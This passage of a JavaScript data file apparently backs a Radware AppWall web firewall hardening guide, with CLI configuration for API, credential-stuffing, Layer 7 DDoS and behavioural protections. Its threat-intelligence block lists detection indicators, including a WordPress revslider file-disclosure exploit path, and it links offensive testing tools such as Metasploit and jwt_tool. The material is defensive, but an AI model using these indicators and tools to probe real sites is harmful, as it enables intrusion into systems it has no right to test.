                    <div><span class="code-command">policy</span> <span class="code-value">"API-Services"</span></div>
                    <div><span class="code-command">api-security</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># API schema validation</div>
                    <div><span class="code-command">schema-validation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">schema-type</span> <span class="code-value">openapi-v3</span></div>
                    <div><span class="code-param">schema-file</span> <span class="code-value">"/tmp/api-schema.json"</span></div>
                    <div><span class="code-param">validation-level</span> <span class="code-value">strict</span></div>
                    <div class="code-comment"># API authentication</div>
                    <div><span class="code-command">authentication</span></div>
                    <div><span class="code-param">token-location</span> <span class="code-value">header</span></div>
                    <div><span class="code-param">token-name</span> <span class="code-value">"Authorization"</span></div>
                    <div><span class="code-param">token-type</span> <span class="code-value">"Bearer"</span></div>
                    <div><span class="code-param">jwks-url</span> <span class="code-value">"https://auth.example.com/.well-known/jwks.json"</span></div>
                    <div class="code-comment"># API rate limiting</div>
                    <div><span class="code-command">rate-limiting</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">per-endpoint</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">per-client</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/v1/users"</span> <span class="code-param">method</span> <span class="code-value">"POST"</span> <span class="code-param">limit</span> <span class="code-value">5</span> <span class="code-param">period</span> <span class="code-value">60</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">API Security Threats & Protections</h5>
                <p class="mb-4 text-gray-700">Common API security threats and appropriate protection strategies:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">API Threat</th>
                            <th class="p-3 border bg-gray-100">Protection Mechanism</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Broken Authentication</td>
                            <td class="p-3 border">JWT validation, OAuth token verification, API key protection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Excessive Data Exposure</td>
                            <td class="p-3 border">Response filtering, data leakage prevention, schema validation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Resource Exhaustion</td>
                            <td class="p-3 border">Request rate limiting, payload size controls, timeout management</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Broken Access Control</td>
                            <td class="p-3 border">Endpoint access policies, scope validation, role verification</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Mass Assignment</td>
                            <td class="p-3 border">Schema validation, allowed property lists</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Parameter Tampering</td>
                            <td class="p-3 border">Parameter validation, type enforcement, range checking</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Schema Violation</td>
                            <td class="p-3 border">OpenAPI/Swagger validation, content-type enforcement</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced API Security Configuration</h5>
                <p class="mb-4 text-gray-700">Implement advanced API security controls for comprehensive protection:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced API security</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"API-Services"</span></div>
                    <div><span class="code-command">api-security</span></div>
                    <div class="code-comment"># GraphQL protection</div>
                    <div><span class="code-command">graphql-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">max-query-depth</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">max-query-complexity</span> <span class="code-value">1000</span></div>
                    <div><span class="code-param">introspection-query-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">batch-query-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Advanced JWT validation</div>
                    <div><span class="code-command">jwt-validation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">algorithm-restriction</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-algorithms</span> <span class="code-value">"RS256,ES256"</span></div>
                    <div><span class="code-param">block-algorithm</span> <span class="code-value">"none,HS256"</span></div>
                    <div><span class="code-param">exp-claim-required</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">nbf-claim-required</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">key-rotation-check</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># API sequence validation</div>
                    <div><span class="code-command">sequence-validation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">sequence</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"user-creation"</span></div>
                    <div><span class="code-command">sequence</span> <span class="code-value">"user-creation"</span></div>
                    <div><span class="code-param">step</span> <span class="code-value">1</span> <span class="code-param">url</span> <span class="code-value">"/api/v1/users/validate"</span> <span class="code-param">method</span> <span class="code-value">"POST"</span></div>
                    <div><span class="code-param">step</span> <span class="code-value">2</span> <span class="code-param">url</span> <span class="code-value">"/api/v1/users"</span> <span class="code-param">method</span> <span class="code-value">"POST"</span></div>
                    <div><span class="code-param">enforcement</span> <span class="code-value">strict</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Credential Stuffing Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure protection against credential stuffing attacks where attackers use stolen username/password combinations.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure credential stuffing protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">credential-stuffing</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">login-url</span> <span class="code-value">"/login"</span> <span class="code-param">method</span> <span class="code-value">"POST"</span></div>
                    <div><span class="code-param">username-parameter</span> <span class="code-value">"username"</span></div>
                    <div><span class="code-param">password-parameter</span> <span class="code-value">"password"</span></div>
                    <div class="code-comment"># Progressive defense measures</div>
                    <div><span class="code-param">detection-threshold</span> <span class="code-value">medium</span></div>
                    <div><span class="code-param">login-success-url</span> <span class="code-value">"/dashboard"</span></div>
                    <div><span class="code-param">login-failure-url</span> <span class="code-value">"/login?error=1"</span></div>
                    <div class="code-comment"># Defense mechanisms</div>
                    <div><span class="code-command">defense</span></div>
                    <div><span class="code-param">rate-limiting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">captcha</span> <span class="code-value">enable</span> <span class="code-param">threshold</span> <span class="code-value">3</span></div>
                    <div><span class="code-param">device-fingerprinting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ip-reputation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">username-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">temporary-lockout</span> <span class="code-value">enable</span> <span class="code-param">attempts</span> <span class="code-value">5</span> <span class="code-param">duration</span> <span class="code-value">300</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Multi-layered Defense</h5>
                <p class="mb-4 text-gray-700">Effective credential stuffing protection requires multiple coordinated defensive layers:</p>
                <ol class="list-decimal pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Login Attempt Rate Limiting:</strong> Restrict login attempts per IP address or username</li>
                    <li class="mb-2"><strong>Progressive Challenges:</strong> Introduce increasing friction for suspicious login attempts</li>
                    <li class="mb-2"><strong>Device Fingerprinting:</strong> Track and analyze devices used for login attempts</li>
                    <li class="mb-2"><strong>Behavioral Analysis:</strong> Identify abnormal login patterns across accounts</li>
                    <li class="mb-2"><strong>IP Reputation:</strong> Block or challenge logins from known malicious IPs</li>
                    <li class="mb-2"><strong>Username Enumeration Prevention:</strong> Provide identical responses for valid/invalid usernames</li>
                    <li><strong>Anomaly Detection:</strong> Identify unusual login activity patterns across the platform</li>
                </ol>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Credential Stuffing Protection</h5>
                <p class="mb-4 text-gray-700">Implement advanced protections against sophisticated credential stuffing attacks:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced credential stuffing protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">credential-stuffing</span></div>
                    <div class="code-comment"># Advanced detection mechanisms</div>
                    <div><span class="code-command">advanced-detection</span></div>
                    <div><span class="code-param">leaked-credential-check</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">password-hash-api-url</span> <span class="code-value">"https://api.pwnedpasswords.com/range/"</span></div>
                    <div><span class="code-param">velocity-check</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">velocity-threshold</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">cross-account-velocity</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Advanced response options</div>
                    <div><span class="code-command">response-options</span></div>
                    <div><span class="code-param">tarpit</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">tarpit-delay</span> <span class="code-value">5000</span></div>
                    <div><span class="code-param">progressive-delay</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">multi-factor-trigger</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">multi-factor-threshold</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Deception techniques</div>
                    <div><span class="code-command">deception</span></div>
                    <div><span class="code-param">fake-success-responses</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">success-response-threshold</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">honeypot-accounts</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Layer 7 DDoS Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure protection against application layer (Layer 7) Distributed Denial of Service attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure Layer 7 DDoS protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">ddos-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Baseline traffic profile</div>
                    <div><span class="code-param">auto-baselining</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">learning-period</span> <span class="code-value">7</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                    <div class="code-comment"># HTTP flood protection</div>
                    <div><span class="code-command">http-flood</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">request-threshold</span> <span class="code-value">5000</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">challenge</span></div>
                    <div class="code-comment"># Slow HTTP attack protection</div>
                    <div><span class="code-command">slow-http</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">timeout</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">min-rate</span> <span class="code-value">500</span></div>
                    <div class="code-comment"># Targeted URL protection</div>
                    <div><span class="code-command">protected-url</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/search"</span></div>
                    <div><span class="code-command">protected-url</span> <span class="code-value">"/api/search"</span></div>
                    <div><span class="code-param">request-threshold</span> <span class="code-value">1000</span></div>
                    <div><span class="code-param">burst-threshold</span> <span class="code-value">2000</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">throttle</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Layer 7 DDoS Attack Types & Mitigations</h5>
                <p class="mb-4 text-gray-700">Common application layer DDoS attacks and their mitigation strategies:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attack Type</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Mitigation</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">HTTP Flood</td>
                            <td class="p-3 border">High volume of HTTP GET/POST requests</td>
                            <td class="p-3 border">Rate limiting, challenge-response, behavioral analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Slowloris</td>
                            <td class="p-3 border">Slow request headers sent at intervals</td>
                            <td class="p-3 border">Connection timeout, header completion requirements</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Slow POST</td>
                            <td class="p-3 border">POST request body sent at slow rate</td>
                            <td class="p-3 border">Minimum transfer rate enforcement, request timeouts</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">RUDY (R-U-Dead-Yet)</td>
                            <td class="p-3 border">Form submissions with very long content-length</td>
                            <td class="p-3 border">Maximum body size limits, transfer rate requirements</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Cache Busting</td>
                            <td class="p-3 border">Random query parameters to bypass caching</td>
                            <td class="p-3 border">URL normalization, query parameter analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Resource Exhaustion</td>
                            <td class="p-3 border">Targeting CPU/memory-intensive operations</td>
                            <td class="p-3 border">Resource allocation limits, complexity monitoring</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Layer 7 DDoS Protection</h5>
                <p class="mb-4 text-gray-700">Implement advanced Layer 7 DDoS protection with machine learning capabilities:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced Layer 7 DDoS protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">ddos-protection</span></div>
                    <div class="code-comment"># Machine learning based detection</div>
                    <div><span class="code-command">ml-detection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">analysis-period</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">confidence-threshold</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">adaptive-thresholds</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">seasonal-adjustment</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># HTTP/2 specific protections</div>
                    <div><span class="code-command">http2-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">max-concurrent-streams</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">header-compression-attack-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">stream-multiplexing-abuse-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># CDN integration</div>
                    <div><span class="code-command">cdn-integration</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">provider</span> <span class="code-value">"cloudflare"</span></div>
                    <div><span class="code-param">api-key</span> <span class="code-value">encrypt</span></div>
                    <div><span class="code-param">zone-id</span> <span class="code-value">"abc123def456"</span></div>
                    <div><span class="code-param">trigger-level</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Behavioral Analysis Configuration',
            content: `
                <p class="mb-4 text-gray-700">Implement behavioral analysis to detect anomalous user activity and potential threats.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure behavioral analysis</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">behavioral-analysis</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Baseline profiling</div>
                    <div><span class="code-param">baseline-period</span> <span class="code-value">7</span></div>
                    <div><span class="code-param">profile-update-frequency</span> <span class="code-value">daily</span></div>
                    <div><span class="code-param">confidence-threshold</span> <span class="code-value">medium</span></div>
                    <div class="code-comment"># User interaction monitoring</div>
                    <div><span class="code-command">interaction-monitoring</span></div>
                    <div><span class="code-param">client-side-collection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">mouse-movement</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">keystroke-timing</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">form-interaction-time</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">scroll-behavior</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">touch-gestures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Navigation monitoring</div>
                    <div><span class="code-command">navigation-monitoring</span></div>
                    <div><span class="code-param">navigation-pattern</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">page-view-time</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">site-traversal-pattern</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">entry-exit-points</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">linear-navigation-requirement</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Response actions</div>
                    <div><span class="code-command">response-actions</span></div>
                    <div><span class="code-param">low-confidence-action</span> <span class="code-value">monitor</span></div>
                    <div><span class="code-param">medium-confidence-action</span> <span class="code-value">challenge</span></div>
                    <div><span class="code-param">high-confidence-action</span> <span class="code-value">block</span></div>
                    <div><span class="code-param">silent-mode</span> <span class="code-value">disable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Behavioral Analysis Indicators</h5>
                <p class="mb-4 text-gray-700">Key behavioral indicators that can identify automated or malicious activity:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Behavioral Indicator</th>
                            <th class="p-3 border bg-gray-100">Human Behavior</th>
                            <th class="p-3 border bg-gray-100">Suspicious/Bot Behavior</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Mouse Movement</td>
                            <td class="p-3 border">Non-linear, varied speed, occasionally stops</td>
                            <td class="p-3 border">Perfect straight lines, constant speed, no pauses</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Typing Cadence</td>
                            <td class="p-3 border">Variable speed, occasional errors, natural pauses</td>
                            <td class="p-3 border">Uniform speed, no errors, unnatural timing</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Page Interaction</td>
                            <td class="p-3 border">Scrolling, reading time, varied focus areas</td>
                            <td class="p-3 border">No scrolling, immediate form submission, no exploration</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Navigation Pattern</td>
                            <td class="p-3 border">Logical progression through site, varied page views</td>
                            <td class="p-3 border">Direct access to target pages, unusual access patterns</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Session Timing</td>
                            <td class="p-3 border">Natural timing between actions, rest periods</td>
                            <td class="p-3 border">Consistent timing, no breaks, 24/7 activity</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Form Interaction</td>
                            <td class="p-3 border">Field-by-field completion, corrections, tab navigation</td>
                            <td class="p-3 border">Instant form population, no field focus changes</td>
                        </tr>
                    </tbody>
                </table>
            `
        },
        {
            title: 'Threat Intelligence Integration',
            content: `
                <p class="mb-4 text-gray-700">Integrate threat intelligence feeds to enhance detection and prevention capabilities.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure threat intelligence integration</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">threat-intelligence</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># IP reputation feeds</div>
                    <div><span class="code-command">ip-reputation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">update-frequency</span> <span class="code-value">hourly</span></div>
                    <div><span class="code-command">feed</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Radware-Feed"</span> <span class="code-param">type</span> <span class="code-value">"built-in"</span></div>
                    <div><span class="code-command">feed</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"ThreatIntel-Feed"</span> <span class="code-param">type</span> <span class="code-value">"custom"</span> <span class="code-param">url</span> <span class="code-value">"https://feeds.example.com/ip-reputation.txt"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Malicious indicator feeds</div>
                    <div><span class="code-command">malicious-indicators</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">categories</span> <span class="code-value">"malware,phishing,command-and-control"</span></div>
                    <div><span class="code-command">indicator</span> <span class="code-value">add</span> <span class="code-param">type</span> <span class="code-value">"url-pattern"</span> <span class="code-param">value</span> <span class="code-value">"/wp-admin/admin-ajax\\.php\\?action=revslider_show_image"</span> <span class="code-param">confidence</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">indicator</span> <span class="code-value">add</span> <span class="code-param">type</span> <span class="code-value">"user-agent"</span> <span class="code-param">value</span> <span class="code-value">"BlackSun"</span> <span class="code-param">confidence</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Vulnerability feed integration</div>
                    <div><span class="code-command">vulnerability-feed</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">update-frequency</span> <span class="code-value">daily</span></div>
                    <div><span class="code-param">minimum-cvss-score</span> <span class="code-value">7.0</span></div>
                    <div><span class="code-param">auto-generate-rules</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">affected-components</span> <span class="code-value">"apache,nginx,wordpress,drupal,joomla"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Threat Intelligence Benefits</h5>
                <p class="mb-4 text-gray-700">Key benefits of integrating threat intelligence with WAF protection:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Proactive Defense:</strong> Block known malicious sources before they can attack</li>
                    <li class="mb-2"><strong>Reduced False Positives:</strong> Better context for decision-making through reputation data</li>
                    <li class="mb-2"><strong>Zero-Day Protection:</strong> Early warning of new attack techniques and vectors</li>
                    <li class="mb-2"><strong>Automated Rule Generation:</strong> Create virtual patches for newly discovered vulnerabilities</li>
                    <li class="mb-2"><strong>Contextual Analysis:</strong> Enrich security events with threat actor information</li>
                    <li><strong>Adaptive Security:</strong> Adjust protection levels based on emerging threats</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'Bot Detection Tester',
            icon: 'fa-robot',
            description: 'Test bot detection capabilities against various automated tools and scripts.',
            link: 'https://github.com/bmarvinb/puppeteer-extra-plugin-stealth',
            linkText: 'Puppeteer Stealth'
        },
        {
            title: 'API Security Scanner',
            icon: 'fa-plug',
            description: 'Test API endpoints for security vulnerabilities and configuration issues.',
            link: 'https://github.com/OWASP/APICheck',
            linkText: 'OWASP APICheck'
        },
        {
            title: 'Credential Stuffing Simulator',
            icon: 'fa-user-secret',
            description: 'Test credential stuffing protections with simulated login attempts.',
            link: 'https://github.com/rapid7/metasploit-framework',
            linkText: 'Metasploit'
        },
        {
            title: 'DDoS Testing Tool',
            icon: 'fa-server',
            description: 'Test Layer 7 DDoS protection with controlled load testing.',
            link: 'https://github.com/loadimpact/k6',
            linkText: 'k6'
        },
        {
            title: 'OWASP ModSecurity CRS',
            icon: 'fa-shield-alt',
            description: 'Core Rule Set providing protection against various web application attacks.',
            link: 'https://coreruleset.org/',
            linkText: 'CRS Project'
        },
        {
            title: 'GraphQL Security Testing',
            icon: 'fa-project-diagram',
            description: 'Tools for testing GraphQL endpoint security and query validation.',
            link: 'https://github.com/nikitastupin/clairvoyance',
            linkText: 'Clairvoyance'
        },
        {
            title: 'JWT Tool',
            icon: 'fa-key',
            description: 'Test and attack JWT tokens for security vulnerabilities.',
            link: 'https://github.com/ticarpi/jwt_tool',
            linkText: 'JWT Tool'
        },
        {
            title: 'Slow HTTP Test',
            icon: 'fa-tachometer-alt',
            description: 'Test application resilience against Slowloris and slow HTTP attacks.',
            link: 'https://github.com/shekyan/slowhttptest',
            linkText: 'SlowHTTPTest'
        },
        {
            title: 'MISP Threat Sharing',
            icon: 'fa-share-alt',
            description: 'Open source threat intelligence platform for threat sharing.',
            link: 'https://www.misp-project.org/',
            linkText: 'MISP Project'
        },
        {
            title: 'User Behavior Simulator',
            icon: 'fa-users',
            description: 'Simulate human-like user behavior for testing behavioral analysis systems.',
            link: 'https://github.com/selenium-webdriver-book/source',
            linkText: 'Selenium Framework'
        },
        {
            title: 'HTTP/2 Testing Tool',
            icon: 'fa-network-wired',
            description: 'Test HTTP/2 implementation security and resilience against attacks.',
            link: 'https://github.com/summerwind/h2spec',
            linkText: 'h2spec'
        },
        {
            title: 'IP Reputation Service',
            icon: 'fa-globe',
            description: 'Check IP addresses against reputation databases for threat intelligence.',
            link: 'https://www.abuseipdb.com/',
            linkText: 'AbuseIPDB'
        }
    ]
},
        {
    id: 'performance',
    title: '8. Performance Optimization',
    subtitle: 'Tuning for minimal latency and maximum protection',
    icon: 'fa-tachometer-alt',
    priority: 'medium',
    progress: 33,
    checklist: [
        {
            title: '8.1 Hardware Optimization',
            icon: 'fa-server',
            items: [
                { id: '8.1.1', text: 'Configure hardware resource allocation', priority: 'high' },
                { id: '8.1.2', text: 'Set up CPU affinity for optimal processing', priority: 'medium' },
                { id: '8.1.3', text: 'Configure memory allocation for traffic analysis', priority: 'high' },
                { id: '8.1.4', text: 'Optimize network interface settings', priority: 'medium' },
                { id: '8.1.5', text: 'Configure disk I/O for logging efficiency', priority: 'medium' },
                { id: '8.1.6', text: 'Implement NUMA node optimization for multi-socket systems', priority: 'medium' },
                { id: '8.1.7', text: 'Configure interrupt handling for network interfaces', priority: 'medium' },
                { id: '8.1.8', text: 'Set up hardware acceleration for cryptographic operations', priority: 'high' },
                { id: '8.1.9', text: 'Optimize TCP/IP stack parameters', priority: 'medium' },
                { id: '8.1.10', text: 'Configure network buffer sizes for high throughput', priority: 'high' },
                { id: '8.1.11', text: 'Implement jumbo frames for appropriate network segments', priority: 'low' },
                { id: '8.1.12', text: 'Set up I/O scheduler optimization for SSDs', priority: 'medium' }
            ]
        },
        {
            title: '8.2 Policy Optimization',
            icon: 'fa-bolt',
            items: [
                { id: '8.2.1', text: 'Configure policy-based inspection depth', priority: 'high' },
                { id: '8.2.2', text: 'Set up URL-specific protection levels', priority: 'medium' },
                { id: '8.2.3', text: 'Optimize signature matching algorithms', priority: 'high' },
                { id: '8.2.4', text: 'Configure response inspection thresholds', priority: 'medium' },
                { id: '8.2.5', text: 'Set up attack category prioritization', priority: 'medium' },
                { id: '8.2.6', text: 'Implement content-based inspection triggers', priority: 'high' },
                { id: '8.2.7', text: 'Configure transaction sampling for high-volume endpoints', priority: 'medium' },
                { id: '8.2.8', text: 'Set up risk-based protection levels', priority: 'high' },
                { id: '8.2.9', text: 'Optimize regular expression processing', priority: 'high' },
                { id: '8.2.10', text: 'Implement efficient whitelist processing', priority: 'medium' },
                { id: '8.2.11', text: 'Configure policy hierarchy for efficient evaluation', priority: 'medium' },
                { id: '8.2.12', text: 'Set up early termination for policy evaluation', priority: 'medium' }
            ]
        },
        {
            title: '8.3 Traffic Management',
            icon: 'fa-random',
            items: [
                { id: '8.3.1', text: 'Configure traffic-based dynamic scaling', priority: 'high' },
                { id: '8.3.2', text: 'Set up connection pooling for backend servers', priority: 'medium' },
                { id: '8.3.3', text: 'Implement HTTP/2 support for efficiency', priority: 'medium' },
                { id: '8.3.4', text: 'Configure SSL/TLS session caching', priority: 'medium' },
                { id: '8.3.5', text: 'Set up compression handling policies', priority: 'low' },
                { id: '8.3.6', text: 'Optimize traffic analysis sampling rates', priority: 'medium' },
                { id: '8.3.7', text: 'Implement TCP optimizations for WAN connections', priority: 'medium' },
                { id: '8.3.8', text: 'Configure intelligent content routing', priority: 'medium' },
                { id: '8.3.9', text: 'Set up traffic prioritization for critical services', priority: 'high' },
                { id: '8.3.10', text: 'Implement connection timeout optimization', priority: 'medium' },
                { id: '8.3.11', text: 'Configure protocol-specific optimizations', priority: 'medium' },
                { id: '8.3.12', text: 'Set up traffic shaping for bandwidth management', priority: 'medium' }
            ]
        },
        {
            title: '8.4 Performance Monitoring',
            icon: 'fa-chart-line',
            items: [
                { id: '8.4.1', text: 'Configure performance baseline monitoring', priority: 'high' },
                { id: '8.4.2', text: 'Set up latency and throughput tracking', priority: 'medium' },
                { id: '8.4.3', text: 'Implement resource utilization monitoring', priority: 'medium' },
                { id: '8.4.4', text: 'Configure performance degradation alerts', priority: 'high' },
                { id: '8.4.5', text: 'Set up application response time monitoring', priority: 'medium' },
                { id: '8.4.6', text: 'Implement real-time performance dashboards', priority: 'medium' },
                { id: '8.4.7', text: 'Configure per-policy performance metrics', priority: 'medium' },
